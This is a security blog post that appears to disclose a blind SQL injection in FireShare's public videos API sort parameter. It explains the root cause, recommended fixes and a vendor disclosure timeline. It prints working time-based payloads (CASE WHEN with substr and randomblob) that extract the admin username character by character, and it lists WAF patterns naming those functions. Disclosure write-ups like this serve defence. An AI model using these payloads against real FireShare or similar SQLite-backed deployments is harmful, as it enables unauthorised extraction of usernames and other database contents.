---
date: 2025-08-20 19:52:39
layout: post
title: Blind SQL Injection in FireShare, Found in an API sort Parameter
description: Blind SQL Injection in FireShare, Found in an API sort Parameter
image: /assets/img/uploads/20250425_0752_hacker-duck-vibes_remix_01jsppw8k0fg2ay4nmng7cpe87.png
optimized_image: /assets/img/uploads/20250425_0752_hacker-duck-vibes_remix_01jsppw8k0fg2ay4nmng7cpe87.png
category: research
tags:
  - security
  - web
  - filesharing
  - security
  - cybersecurity
  - research
  - hacking
  - hacked
  - vulnerability
author: CyberDucky
paginate: false
---
\
Severity: High\
Impact: Sensitive Data Extraction (Usernames, Role Discovery)

- - -

## How I Found It

While exploring the /api/videos/public endpoint, I noticed the sort parameter was behaving oddly. Instead of rejecting unexpected values, the backend seemed to pass whatever I gave it directly into the query. That raised a red flag.

I suspected SQL injection, but this wasn’t a straightforward one where you instantly see errors or output. Instead, it turned out to be time-based blind SQL injection—which means the attacker gets clues from how long the server takes to respond, even if no data is shown directly. Here, the injection was hidden inside the ORDER BY clause, which normally controls the order of results.

- - -

## The Endpoint

```
GET /api/videos/public?sort=

```

- - -

## The Breakthrough

To test the idea, I injected a payload designed to cause a noticeable delay if a certain condition was true. Here’s the one that worked:

```
(SELECT CASE WHEN substr((SELECT username FROM user LIMIT 1 OFFSET 0), 1, 1) = 'a' 
    THEN randomblob(100000000) ELSE 'a' END)
```

What this does:

* It checks the first character of the first username in the user table.
* If the character is 'a', it generates a huge random blob to slow the query down.
* By measuring response time, I could infer whether my guess was right.

That’s classic blind SQLi. By repeating the process one character at a time, you can reconstruct entire usernames without ever seeing them directly.

- - -

## Extracting admin

Using this approach, I was able to confirm the presence of an admin account by testing each character:

```
(SELECT CASE WHEN substr((SELECT username FROM user LIMIT 1 OFFSET 0), 1, 1) = 'a' THEN randomblob(100000000) ELSE 'a' END)
(SELECT CASE WHEN substr((SELECT username FROM user LIMIT 1 OFFSET 0), 2, 1) = 'd' THEN randomblob(100000000) ELSE 'a' END)
(SELECT CASE WHEN substr((SELECT username FROM user LIMIT 1 OFFSET 0), 3, 1) = 'm' THEN randomblob(100000000) ELSE 'a' END)
(SELECT CASE WHEN substr((SELECT username FROM user LIMIT 1 OFFSET 0), 4, 1) = 'i' THEN randomblob(100000000) ELSE 'a' END)
(SELECT CASE WHEN substr((SELECT username FROM user LIMIT 1 OFFSET 0), 5, 1) = 'n' THEN randomblob(100000000) ELSE 'a' END)
```

Each payload introduced a delay, confirming that the username was indeed admin.

To double-check, I ran a direct string comparison:

```
(SELECT CASE WHEN (SELECT username FROM user LIMIT 1 OFFSET 0) = 'admin' 
    THEN randomblob(100000000) ELSE 'a' END)

```

The delay confirmed it — the first account was admin.

- - -

## Root Cause

The vulnerable query looks something like this:

```
SELECT * FROM video JOIN ... WHERE ... ORDER BY <user_input>
```

The sort parameter is directly interpolated into the ORDER BY clause with no validation or sanitization, making it trivial for an attacker to inject arbitrary SQL expressions.

- - -

## Why It’s Dangerous

An attacker could use this to:

* Extract usernames, emails, and possibly password hashes.
* Enumerate tables and columns in the database.
* Confirm and impersonate high-privilege users like admin.

- - -

## Fixes I’d Recommend

1. Don’t trust user input in queries. Use parameterized queries and ORM-safe ordering functions.
2. Whitelist allowed sort values. Only accept known-good column names.
3. Validate inputs. Never pass unchecked data into an ORDER BY clause.
4. Additional defenses:
5. * Add rate limiting to slow down brute-force extraction.
   * Deploy WAF (Web Application Firewall) rules that block patterns like randomblob(, substr(, or CASE WHEN (all of which are SQL-related commands attackers might use during injection attempts).

Example ORM-safe code with SQLAlchemy:

```
if sort in allowed_columns:
    query = query.order_by(getattr(Model, sort))

```

- - -

## Timeline

* Day 0 – Found and confirmed the vulnerability.
* Day 1 – Reported it to the vendor.
* Day 30 – Plan to disclose publicly if no fix is in place.

- - -

## Final Thoughts

This one was fun because it looked harmless at first. A sort parameter doesn’t scream “critical vulnerability,” but since it was dropped straight into the query, it turned into a high-impact blind SQL injection.

I didn’t go further than confirming the admin account existed, but with enough patience, an attacker could dump the entire database.

Hopefully, this helps the team patch things up before anyone malicious stumbles across it.



## References:

<https://github.com/ShaneIsrael/fireshare/issues/311#event-18823718517>

<https://github.com/ShaneIsrael/fireshare/releases/tag/v1.2.26>